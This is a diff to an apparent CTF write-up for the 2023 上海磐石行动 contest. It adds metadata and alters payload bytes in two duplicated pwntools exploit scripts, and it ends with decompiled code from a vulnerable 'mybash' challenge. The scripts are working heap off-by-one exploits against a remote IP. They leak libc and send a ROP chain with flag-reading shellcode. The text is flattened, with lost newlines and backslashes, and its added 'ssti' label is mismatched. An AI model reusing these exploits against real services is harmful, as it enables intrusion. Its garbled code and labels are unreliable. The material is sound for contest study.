@@ -74,6 +74,9 @@ prerequisites:
 - SROP（Sigreturn-Oriented Programming）原理
 - glibc heap off-by-one 利用链
 - ucontext_t 结构与栈布局
+contest_normalized: "上海磐石行动"
+contest_year: 2023
+subcategory_guess: "ssti"
 ---
 # 2023上海磐石行动-WP -Polaris战队
 
@@ -149,7 +152,7 @@ from pwn import *context.clear(arch='amd64', os='linux', log_level='info')
 sh = remote('116.236.144.37', 20429)
 def request(path, headers, payload):    prefix = b'''Host: localhostConnection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7'''.replace(b'n', b'rn')    req = b'POST ' + path + b' HTTP/1.1rn' + prefix    for k in headers:        req += k + b': ' + headers[k] + b'rn'    req += b'rn' + payload    sh.recvuntil(b'parser> ')    sh.send(req)
 
-request(b'/login', {b'Username': b'1' * 0x20 + p8(1), b'Content-Length': str(4).encode()}, b' ')for i in range(10):    request(b'/create', {b'Content-Length': str(0xf8).encode()}, b'a' * 0xf8 + b'n')
+request(b'/login', {b'Username': b'1' * 0x20 + p8(1), b'Content-Length': str(4).encode()}, b'\\x00')for i in range(10):    request(b'/create', {b'Content-Length': str(0xf8).encode()}, b'a' * 0xf8 + b'n')
 for i in range(9):    request(b'/delete', {b'Content-Length': str(0).encode(), b'Idx':
 str(i).encode()}, b'n')for i in range(9):    request(b'/create', {b'Content-Length': str(0xf8).encode()}, b'a' * 0xf8 + b'n')request(b'/show', {b'Idx': b'0', b'Content-Length': str(0).encode()}, b'n')heap_addr = u64(sh.recvn(8)) - 0x760success('heap_addr: ' + hex(heap_addr))
 request(b'/show', {b'Idx': b'7', b'Content-Length': str(0).encode()}, b'n')libc_addr = u64(sh.recvn(8)) - 0x3ebe90success('libc_addr: ' + hex(libc_addr))
@@ -178,7 +181,7 @@ shellcode = asm('''    mov eax, 0x67616c66 ;// flag    push rax
     pop rax    test rax, rax    js over
     mov edi, eax    mov rsi, rsp    mov edx, 0x01010201    sub edx, 0x01010101    xor eax, eax    syscall ;// read
     mov edx, eax    mov rsi, rsp    xor eax, eax    inc eax    mov edi, eax    syscall ;// write
-over:    xor edi, edi    mov eax, 0x010101e8    sub eax, 0x01010101    syscall ;// exit''')request(b'/edit', {b'Idx': str(3).encode(), b'Content-Length': str(0+6).encode()}, b'0' + b'a' * 0 + p64(libc_addr + 0x0000000000040558)[:6] + p8(0) + b' ' * 5 + b'abcdabcd' + b' ' * 0x70 + rop_chain + shellcode)
+over:    xor edi, edi    mov eax, 0x010101e8    sub eax, 0x01010101    syscall ;// exit''')request(b'/edit', {b'Idx': str(3).encode(), b'Content-Length': str(0+6).encode()}, b'0' + b'a' * 0 + p64(libc_addr + 0x0000000000040558)[:6] + p8(0) + b'\\x00' * 5 + b'abcdabcd' + b'\\x00' * 0x70 + rop_chain + shellcode)
 sh.interactive()
 
 mysh
@@ -411,7 +414,7 @@ from pwn import *context.clear(arch='amd64', os='linux', log_level='info')
 sh = remote('116.236.144.37', 20429)
 def request(path, headers, payload):    prefix = b'''Host: localhostConnection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7'''.replace(b'n', b'rn')    req = b'POST ' + path + b' HTTP/1.1rn' + prefix    for k in headers:        req += k + b': ' + headers[k] + b'rn'    req += b'rn' + payload    sh.recvuntil(b'parser> ')    sh.send(req)
 
-request(b'/login', {b'Username': b'1' * 0x20 + p8(1), b'Content-Length': str(4).encode()}, b' ')for i in range(10):    request(b'/create', {b'Content-Length': str(0xf8).encode()}, b'a' * 0xf8 + b'n')
+request(b'/login', {b'Username': b'1' * 0x20 + p8(1), b'Content-Length': str(4).encode()}, b'\\x00')for i in range(10):    request(b'/create', {b'Content-Length': str(0xf8).encode()}, b'a' * 0xf8 + b'n')
 for i in range(9):    request(b'/delete', {b'Content-Length': str(0).encode(), b'Idx':
 str(i).encode()}, b'n')for i in range(9):    request(b'/create', {b'Content-Length': str(0xf8).encode()}, b'a' * 0xf8 + b'n')request(b'/show', {b'Idx': b'0', b'Content-Length': str(0).encode()}, b'n')heap_addr = u64(sh.recvn(8)) - 0x760success('heap_addr: ' + hex(heap_addr))
 request(b'/show', {b'Idx': b'7', b'Content-Length': str(0).encode()}, b'n')libc_addr = u64(sh.recvn(8)) - 0x3ebe90success('libc_addr: ' + hex(libc_addr))
@@ -440,7 +443,7 @@ shellcode = asm('''    mov eax, 0x67616c66 ;// flag    push rax
     pop rax    test rax, rax    js over
     mov edi, eax    mov rsi, rsp    mov edx, 0x01010201    sub edx, 0x01010101    xor eax, eax    syscall ;// read
     mov edx, eax    mov rsi, rsp    xor eax, eax    inc eax    mov edi, eax    syscall ;// write
-over:    xor edi, edi    mov eax, 0x010101e8    sub eax, 0x01010101    syscall ;// exit''')request(b'/edit', {b'Idx': str(3).encode(), b'Content-Length': str(0+6).encode()}, b'0' + b'a' * 0 + p64(libc_addr + 0x0000000000040558)[:6] + p8(0) + b' ' * 5 + b'abcdabcd' + b' ' * 0x70 + rop_chain + shellcode)
+over:    xor edi, edi    mov eax, 0x010101e8    sub eax, 0x01010101    syscall ;// exit''')request(b'/edit', {b'Idx': str(3).encode(), b'Content-Length': str(0+6).encode()}, b'0' + b'a' * 0 + p64(libc_addr + 0x0000000000040558)[:6] + p8(0) + b'\\x00' * 5 + b'abcdabcd' + b'\\x00' * 0x70 + rop_chain + shellcode)
 sh.interactive()
 __int64 __fastcall echo(char **args){  dir *v2; // rbx  int v3; // [rsp+14h] [rbp-3Ch]  int i; // [rsp+14h] [rbp-3Ch]  int chunk_size; // [rsp+18h] [rbp-38h]  int v6; // [rsp+1Ch] [rbp-34h]  int size; // [rsp+24h] [rbp-2Ch]  dir *child; // [rsp+28h] [rbp-28h] BYREF  const char *v9; // [rsp+30h] [rbp-20h]  unsigned __int64 v10; // [rsp+38h] [rbp-18h]
   v10 = __readfsqword(0x28u);  v3 = 0;  if ( args[1] )  {    do      ++v3;    while ( args[v3] );    v6 = v3 - 1;    if ( check_redirect(args[v3 - 2]) )    {      for ( i = 1; i < v6; ++i )        printf("%s", args[i]);      puts(args[v6]);      return 1LL;    }    else    {      child = cmd_bak->child;      v9 = args[v6];      if ( (unsigned __int8)check_repeat(&child, v9) != 1 )      {        fprintf(stderr, "mybash: %s: No such filen", v9);        return 1LL;      }      else if ( is_dir(child) )      {        if ( child->buf )        {          chunk_size = get_chunk_size((__int64)child->buf);        }        else        {          chunk_size = 0x1F0;          v2 = child;          v2->buf = (char *)malloc(0x1F0uLL);          if ( !child->buf )            _exit(0);        }        size = strlen(args[v6 - 2]);        while ( size > chunk_size )          chunk_size += 0x1F0;        if ( chunk_size > (unsigned __int64)get_chunk_size((__int64)child->buf) )          child = (dir *)realloc(child->buf, chunk_size);// Structural confusion        strncpy(child->buf, args[v6 - 2], size);        return 1LL;      }      else      {        fprintf(stderr, "mybash: %s: Is a directoryn", v9);        return 1LL;      }    }  }  else  {    putchar('n');    return 1LL;  }}
